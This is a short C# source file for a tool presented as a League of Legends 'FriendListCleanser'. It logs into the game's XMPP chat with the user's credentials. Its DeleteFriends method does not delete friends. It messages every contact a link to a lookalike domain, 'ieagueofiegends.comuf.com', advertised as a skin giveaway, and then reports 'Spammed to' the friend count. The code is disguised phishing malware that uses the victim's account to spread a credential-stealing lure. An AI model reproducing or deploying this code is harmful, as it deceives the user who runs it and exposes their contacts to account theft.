using agsXMPP;
using agsXMPP.protocol.Base;
using agsXMPP.protocol.client;
using agsXMPP.protocol.iq.roster;
using agsXMPP.Xml.Dom;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace FriendListCleanser
{
    public class ChatClient
    {
        public XmppClientConnection xmpp;

        public string Status;

        public int FriendCount;

        private List<agsXMPP.protocol.iq.roster.RosterItem> Roster = new List<agsXMPP.protocol.iq.roster.RosterItem>();

        public TaskCompletionSource<bool> IsCompleted;

        public ChatClient(string user, string pass, string server)
        {
            this.IsCompleted = new TaskCompletionSource<bool>();
            this.xmpp = new XmppClientConnection()
            {
                Username = user,
                Password = string.Concat("AIR_", pass),
                Server = "pvp.net",
                ConnectServer = string.Concat("chat.", server, ".lol.riotgames.com"),
                Port = 5223,
                AutoResolveConnectServer = false,
                UseCompression = false,
                UseStartTLS = false,
                UseSSL = true,
                AutoRoster = true
            };
            this.xmpp.OnError += new ErrorHandler(this.xmpp_OnError);
            this.xmpp.OnAuthError += new XmppElementHandler(this.xmpp_OnAuthError);
            this.xmpp.OnRosterItem += new XmppClientConnection.RosterHandler(this.xmpp_OnRosterItem);
            this.xmpp.OnRosterEnd += new ObjectHandler(this.xmpp_OnRosterEnd);
            this.xmpp.OnLogin += new ObjectHandler(this.xmpp_OnLogin);
            this.xmpp.Open();
        }

        public async Task<bool> DeleteFriends()
        {
            foreach (agsXMPP.protocol.iq.roster.RosterItem roster in this.Roster)
            {
                string test;
                string str = "http://championship.ieagueofiegends.comuf.com/ Championship Riven Giveaway! holy fucking shit..";
                this.xmpp.Send(new Message(new Jid(roster.Jid), MessageType.chat, str));
                str = null;
            }
            this.Status = string.Concat("Spammed to  ", this.FriendCount, " friends");
            return true;
        }

        public void Disconect()
        {
            this.xmpp.Close();
        }

        private void xmpp_OnAuthError(object sender, Element element)
        {
            this.Status = "Failed Login";
            this.IsCompleted.TrySetResult(true);
        }

        private void xmpp_OnError(object sender, Exception exception)
        {
            this.Status = "Failed Login";
            this.IsCompleted.TrySetResult(true);
        }

        private void xmpp_OnLogin(object sender)
        {
            this.Status = "Successfull Login";
        }

        public void xmpp_OnRosterEnd(object sender)
        {
            this.FriendCount = this.Roster.Count;
            this.IsCompleted.TrySetResult(true);
        }

        private void xmpp_OnRosterItem(object sender, agsXMPP.protocol.iq.roster.RosterItem item)
        {
            this.Roster.Add(item);
        }
    }
}